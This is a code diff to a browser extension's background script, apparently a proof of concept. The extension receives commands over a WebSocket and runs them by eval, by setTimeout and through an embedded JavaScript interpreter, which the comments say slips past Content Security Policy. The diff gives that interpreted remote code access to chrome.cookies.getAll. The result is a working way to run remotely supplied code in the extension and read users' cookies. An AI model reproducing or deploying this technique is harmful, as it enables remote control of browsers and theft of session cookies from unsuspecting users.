@@ -119,23 +119,12 @@ async function onWsMessage(event) {
 
     if (parsedMessage.type.includes('BG_COMMAND')) {
         // Show that eval is blocked by CSP
-        try {
-            console.log("\nExecuting with eval (CSP block expected) ...")
-            eval(parsedMessage.data);
-        } catch (err) {
-            console.warn(`eval() failed: ${err.message}`);
-        }
+        executeWithEval(parsedMessage.data);
 
         // Show that eval through setTimout is blocked by CSP in the background script
-        try {
-            console.log("\nExecuting with setTimout (CSP block expected) ...")
-            executeWithSetTimeout(parsedMessage.data);
-        } catch (err) {
-            console.warn(`setTimeout() failed: ${err.message}`);
-        }
+        executeWithSetTimeout(parsedMessage.data);
 
         // Alternative, execute the command with the interpreter, goes unnoticed by CSP
-        console.log("\nExecuting with JSInterpreter ...")
         executeWithInterpreter(parsedMessage.data);
     }
 
@@ -164,23 +153,33 @@ async function executeWithDebugger(command, tabId) {
     await chrome.debugger.detach({tabId});
 }
 
+// Execute injected code through a JS interpreter
 function executeWithInterpreter(command) {
+    console.log("\nExecuting with JSInterpreter ...")
+
+    // Define a wrapper for the chrome.cookies.getAll function
+    const portCookies = function(interpreter, globalObject) {
+        const wrapper = function getAll(query, varName) {
+            const nativeQuery = interpreter.pseudoToNative(query)
+
+            chrome.cookies.getAll(nativeQuery, (cookies) => {
+                // TODO: figure out how to return the cookies not just log them
+                console.log(cookies)
+            });
+        };
+
+        // Add the chrome.cookies.getAll function to the interpreter
+        const pseudoChromeFunc = interpreter.nativeToPseudo(chrome);
+        interpreter.setProperty(globalObject, 'chrome', pseudoChromeFunc);
+        const pseudoChromeCookies = interpreter.getProperty(pseudoChromeFunc, 'cookies');
+        interpreter.setProperty(pseudoChromeCookies, 'getAll', interpreter.createNativeFunction(wrapper));
+    }
+
     const initFunc = function (interpreter, globalObject) {
         interpreter.setProperty(globalObject, 'url', String(location));
         interpreter.setProperty(globalObject, 'console', interpreter.nativeToPseudo(console))
 
-        const alertWrapper = function alert(text) {
-            return window.alert(text);
-        };
-        interpreter.setProperty(globalObject, 'alert', interpreter.createNativeFunction(alertWrapper));
-
-        // TODO: figure out how to bind all DOM interfaces to the interpreter
-        // const windowWrapper = function w(command) {
-        //     const parsedCommand = command.slice(7)
-        //     return window[parsedCommand];
-        // };
-        // interpreter.setProperty(globalObject, 'window',
-        //     interpreter.createNativeFunction(windowWrapper));
+        portCookies(interpreter, globalObject)
     };
     const interpreter = new Interpreter(command, initFunc)
     interpreter.run()
@@ -188,5 +187,20 @@ function executeWithInterpreter(command) {
 
 // Execute injected code through a setTimeout
 function executeWithSetTimeout(command) {
-    setTimeout(command);
+    try {
+        console.log("\nExecuting with setTimout (CSP block expected) ...")
+        setTimeout(command);
+    } catch (err) {
+        console.warn(`setTimeout() failed: ${err.message}`);
+    }
+}
+
+// Execute injected code through eval
+function executeWithEval(command) {
+    try {
+        console.log("\nExecuting with eval (CSP block expected) ...")
+        eval(command);
+    } catch (err) {
+        console.warn(`eval() failed: ${err.message}`);
+    }
 }
